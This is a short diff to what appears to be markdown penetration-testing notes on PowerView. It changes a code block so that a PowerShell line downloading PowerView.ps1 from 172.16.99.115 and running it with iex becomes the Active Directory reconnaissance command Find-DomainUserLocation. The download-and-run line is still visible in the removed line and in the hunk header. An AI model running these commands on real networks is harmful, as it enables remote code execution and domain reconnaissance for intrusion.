@@ -186,5 +186,5 @@ iex ((New-Object Net.WebClient).DownloadString('http://172.16.99.115/PowerView.p
 ```
 launch the command
 ```powerview
-iex ((New-Object Net.WebClient).DownloadString('http://172.16.99.115/PowerView.ps1'))
+Find-DomainUserLocation
 ```
